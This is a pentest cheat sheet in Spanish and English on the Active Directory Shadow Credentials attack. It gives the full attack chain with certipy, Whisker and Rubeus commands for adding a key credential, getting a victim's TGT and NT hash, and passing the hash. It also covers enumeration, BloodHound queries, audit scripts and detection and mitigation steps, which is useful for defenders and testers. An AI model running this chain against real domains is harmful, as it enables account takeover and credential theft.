---
aliases:
  - Shadow Credentials
  - msDS-KeyCredentialLink
  - Whisker
  - certipy shadow
tags:
  - type/technique
  - vuln/ad-enumeration
  - technique/credential-access
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AD - Delegation Enumeration]]"
---
# AD - Delegation Enumeration - Shadow Credentials

***

## Concept Overview

| **Aspecto** | **Detalle** | **Importancia** |
|:---:|:---:|:---:|
| Atributo | `msDS-KeyCredentialLink` (multi-value, public key entries) | Modern auth (NgC). |
| Mecanismo | Atacante añade su propio cert al victim → auth as victim via PKINIT | Standard abuse. |
| Required ACL | `WriteProperty msDS-KeyCredentialLink` (GUID `5b47d60f-6090-40b2-9f37-2a4de88f3063`) o GenericAll/GenericWrite | Privesc requirement. |
| Stealthier que ForceChangePassword | No reset victim pwd | OPSEC. |
| Min OS | Server 2016+ schema (NgC support) | Compatibility. |
^ad-shadowcred-concept

___

## msDS-KeyCredentialLink Attribute

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADUser <victim> -Properties msDS-KeyCredentialLink` | Read attr (entries existentes) | Pre-modify. |
| `Get-ADUser -Filter * -Pr msDS-KeyCredentialLink \| ? msDS-KeyCredentialLink` | Users con KeyCred set | Audit anomaly. |
| `Get-ADComputer -Filter * -Pr msDS-KeyCredentialLink \| ? msDS-KeyCredentialLink` | Computers con KeyCred (rare en non-AAD-joined) | Audit. |
| `ldapsearch -h <DC> -D 'corp\u' -w pass -b "DC=corp,DC=local" "(msDS-KeyCredentialLink=*)" samAccountName` | LDAP raw | Linux. |
| `nxc ldap <DC> -u u -p p --query "(msDS-KeyCredentialLink=*)" "samAccountName,msDS-KeyCredentialLink"` | netexec | Quick. |
^ad-shadowcred-attr

___

## Shadow Credentials Attack Chain

| **Step** | **Comando** | **Detalle** |
|:---:|:---:|:---:|
| 1. Identificar ACL `WriteProperty msDS-KeyCredentialLink` sobre victim | `Get-Acl "AD:<victim-DN>"` filter | Pre-attack. |
| 2. Add cert al victim's KeyCredentialLink | `certipy shadow auto -u u -p pass -account victim -dc-ip <DC>` | Linux auto. |
| 3. Auth via PKINIT con cert → recibís TGT del victim | `certipy auth -pfx victim.pfx -dc-ip <DC>` | Standard. |
| 4. Output TGT + NT hash del victim | Direct use | Lateral. |
| 5. Cleanup: clear KeyCred entry | `certipy shadow clear -u u -p pass -account victim -dc-ip <DC>` | Hygiene. |
^ad-shadowcred-chain

```bash
# Pipeline completo Linux con certipy
certipy shadow auto -u atacante@corp.local -p 'pass' -account victim -dc-ip <DC>

# Output:
# [*] Generating certificate
# [*] Adding Key Credential
# [*] Authenticating as victim with certificate
# [*] Got NT hash for victim:
#     aabbccdd11223344...
# [*] Removing Key Credential

# Use NT hash
nxc smb <target> -u victim -H aabbccdd11223344...
```

```cmd
:: Windows con Whisker
Whisker.exe add /target:victim /domain:corp.local /dc:dc01.corp.local

:: Use cert (Rubeus PKINIT)
Rubeus.exe asktgt /user:victim /certificate:<base64-PFX> /password:<pwd> /domain:corp.local /dc:dc01 /ptt
```

___

## ACL Required

| **Comando** | **Qué detecta** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-Acl "AD:<victim-DN>" \| ? Access -match "WriteProperty"` filter por GUID `5b47d60f-6090-40b2-9f37-2a4de88f3063` | Specific WriteProperty msDS-KeyCredentialLink | Per-victim audit. |
| `Find-InterestingDomainAcl -ResolveGUIDs \| ? ObjectAceType -match "ms-DS-Key-Credential-Link"` | Bulk hunt forest-wide | Audit. |
| GenericAll / GenericWrite / WriteDacl en victim | Implícito = puede modify KeyCred | Indirect path. |
^ad-shadowcred-acl

```powershell
# Hunt principals con WriteProperty sobre KeyCred attr
Find-InterestingDomainAcl -ResolveGUIDs |
  Where {
    $_.ObjectAceType -eq "ms-DS-Key-Credential-Link" -or
    ($_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl" -and
     $_.IdentityReferenceClass -eq "user")
  } |
  Select ObjectDN,IdentityReferenceName,ActiveDirectoryRights,ObjectAceType
```

___

## BloodHound AddKeyCredentialLink Edge

| **Cypher** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `MATCH (u)-[:AddKeyCredentialLink]->(t) RETURN u.name,t.name` | All Shadow Cred edges | Inventory. |
| `MATCH (u {owned:true})-[:AddKeyCredentialLink*1..]->(t {highvalue:true}) RETURN u,t` | Path owned → high-value via Shadow Cred | Privesc. |
| `MATCH p=shortestPath((u {owned:true})-[*1..]->(t {highvalue:true})) WHERE any(r IN relationships(p) WHERE type(r) = "AddKeyCredentialLink") RETURN p` | Mixed paths con Shadow Cred edge | Standard. |
^ad-shadowcred-bh

___

## Existing Shadow Credentials Audit

| **Comando** | **Qué detecta** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADUser -Filter * -Pr msDS-KeyCredentialLink,whenChanged \| ? msDS-KeyCredentialLink` | Users con KeyCred (AAD-joined o atacante plant) | Audit. |
| `Get-ADUser -Filter * -Pr msDS-KeyCredentialLink,whenChanged \| ? {$_.'msDS-KeyCredentialLink' -and $_.whenChanged -gt (Get-Date).AddDays(-7)}` | KeyCred añadidos última semana | Persistence hunt. |
| `certipy shadow list -u atacante -p pass -account <victim> -dc-ip <DC>` | List KeyCred entries del victim | Pre-modify check. |
^ad-shadowcred-audit

```powershell
# Hunt persistencia reciente
$Recent = (Get-Date).AddDays(-7)
Get-ADUser -Filter * -Properties msDS-KeyCredentialLink,whenChanged |
  Where { $_.'msDS-KeyCredentialLink' -and $_.whenChanged -gt $Recent } |
  Select Name,SamAccountName,whenChanged
```

___

## Detection & Mitigations

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| Audit Subcategory `Directory Service Changes` | Event 5136 con `msDS-KeyCredentialLink` modify | Defender side. |
| MDI alerta `Suspicious modification of a sensitive attribute` | Modern detection | Real-time. |
| Restrict `WriteProperty msDS-KeyCredentialLink` ACEs | Granular hardening | Audit. |
| `Add-ADGroupMember "Protected Users" -Members <victim>` | PKINIT delegation restrictions | Tier 0. |
| Audit cert authority logs (issued certs) | Cross-correlate suspicious enrollments | SIEM. |
^ad-shadowcred-detection

___

## Modern: NgC = Windows Hello

| **Concept** | **Detalle** | **Cuándo importa** |
|:---:|:---:|:---:|
| Next-Generation Credentials (NgC) | PKI-based AD auth (PKINIT con device cert) | Modern auth. |
| Windows Hello for Business | Usa NgC para passwordless | Hybrid environments. |
| TPM-backed keys | Cert key reside en TPM (no exfiltrable) | Hardware protection. |
| Atacante en NgC environment | KeyCred entries legítimas masivas | Audit harder. |
^ad-shadowcred-ngc

**Audit caveat:** entornos con WHfB tienen KeyCred entries en **muchos users legítimos**. Hunt = filter por `whenChanged` reciente + cross-ref con creator (Event 5136).

***
